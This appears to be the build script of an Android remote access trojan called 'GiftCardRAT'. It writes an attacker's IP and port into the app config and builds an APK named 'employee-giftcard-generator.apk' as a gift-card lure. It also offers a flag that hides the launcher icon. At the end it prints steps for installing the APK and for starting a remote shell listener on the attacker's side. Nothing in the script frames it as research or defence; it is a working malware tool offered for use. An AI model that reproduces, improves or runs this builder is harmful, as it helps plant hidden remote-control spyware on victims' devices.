#!/usr/bin/env python3
"""
GiftCardRAT APK Builder
Pure Python script to build and configure APK using Gradle
"""

import argparse
import subprocess
import sys
import os
import shutil
from pathlib import Path

def print_banner():
    print("""
===================================
  GiftCardRAT APK Builder (Python)
===================================
""")

def validate_ip(ip):
    """Validate IP address or domain name format"""
    # Check if it's a domain name (contains letters or hyphens)
    if any(c.isalpha() or c == '-' for c in ip):
        return True  # Accept domain names
    
    # Otherwise validate as IP address
    parts = ip.split('.')
    if len(parts) != 4:
        return False
    try:
        return all(0 <= int(part) <= 255 for part in parts)
    except ValueError:
        return False

def validate_port(port):
    """Validate port number"""
    try:
        port_num = int(port)
        return 1 <= port_num <= 65535
    except ValueError:
        return False

def update_config(ip, port, hide_icon):
    """Update the Android app configuration file"""
    config_file = Path("Android/app/src/main/java/com/employee/giftcard/config.java")
    
    if not config_file.exists():
        print(f"[ERROR] Config file not found: {config_file}")
        return False
    
    icon_value = "false" if hide_icon else "true"
    
    config_content = f"""package com.employee.giftcard;

public class config {{
    public static String IP = "{ip}";
    public static String port = "{port}";
    public static boolean icon = {icon_value};
}}
"""
    
    try:
        config_file.write_text(config_content)
        print(f"[SUCCESS] Configuration updated")
        print(f"  Server IP:    {ip}")
        print(f"  Server Port:  {port}")
        print(f"  Icon Visible: {not hide_icon}")
        return True
    except Exception as e:
        print(f"[ERROR] Failed to update config: {e}")
        return False

def run_gradle_command(command, description):
    """Run a Gradle command with live output"""
    print(f"\n[INFO] {description}...")
    
    try:
        # Change to Android directory
        android_dir = Path("Android")
        if not android_dir.exists():
            print(f"[ERROR] Android directory not found")
            return False
        
        # Run gradlew command with shell=True for Windows
        if sys.platform == "win32":
            gradle_cmd = f"gradlew.bat {command}"
        else:
            gradle_cmd = f"./gradlew {command}"
        
        process = subprocess.Popen(
            gradle_cmd,
            cwd=android_dir,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            universal_newlines=True,
            bufsize=1,
            shell=True
        )
        
        # Print output in real-time
        for line in process.stdout:
            print(line, end='')
        
        process.wait()
        
        if process.returncode == 0:
            print(f"[SUCCESS] {description} complete")
            return True
        else:
            print(f"[ERROR] {description} failed")
            return False
            
    except Exception as e:
        print(f"[ERROR] Failed to run Gradle: {e}")
        return False

def copy_apk(output_name):
    """Copy the built APK to the root directory"""
    source = Path("Android/app/build/outputs/apk/debug/app-debug.apk")
    destination = Path(output_name)
    
    if not source.exists():
        print(f"[ERROR] Built APK not found at {source}")
        return False
    
    try:
        shutil.copy2(source, destination)
        file_size = destination.stat().st_size / (1024 * 1024)  # MB
        print(f"\n[SUCCESS] APK built successfully!")
        print(f"  Location: {destination.absolute()}")
        print(f"  Size:     {file_size:.2f} MB")
        return True
    except Exception as e:
        print(f"[ERROR] Failed to copy APK: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(
        description='Build GiftCardRAT APK with custom IP and port',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python build_apk.py -i 192.168.1.100 -p 8085
  python build_apk.py -i 192.168.178.41 -p 8085 --hide-icon
  python build_apk.py -i 10.0.0.5 -p 9000 -o custom-name.apk
        """
    )
    
    parser.add_argument('-i', '--ip', required=True, help='Server IP address')
    parser.add_argument('-p', '--port', required=True, help='Server port number')
    parser.add_argument('-o', '--output', default='employee-giftcard-generator.apk',
                        help='Output APK filename (default: employee-giftcard-generator.apk)')
    parser.add_argument('--hide-icon', action='store_true',
                        help='Hide app icon in launcher (default: visible)')
    
    args = parser.parse_args()
    
    # Print banner
    print_banner()
    
    # Validate inputs
    if not validate_ip(args.ip):
        print(f"[ERROR] Invalid IP address: {args.ip}")
        sys.exit(1)
    
    if not validate_port(args.port):
        print(f"[ERROR] Invalid port number: {args.port}")
        sys.exit(1)
    
    # Update configuration
    if not update_config(args.ip, args.port, args.hide_icon):
        sys.exit(1)
    
    # Clean previous builds
    if not run_gradle_command("clean", "Cleaning previous builds"):
        sys.exit(1)
    
    # Build APK
    if not run_gradle_command("assembleDebug", "Building APK"):
        sys.exit(1)
    
    # Copy APK to root
    if not copy_apk(args.output):
        sys.exit(1)
    
    # Print installation instructions
    print(f"""
===================================
[INFO] To install on device:
  adb install -r "{args.output}"

[INFO] To start listener:
  python giftcard-rat.py --shell -i 0.0.0.0 -p {args.port}
===================================
""")

if __name__ == "__main__":
    main()
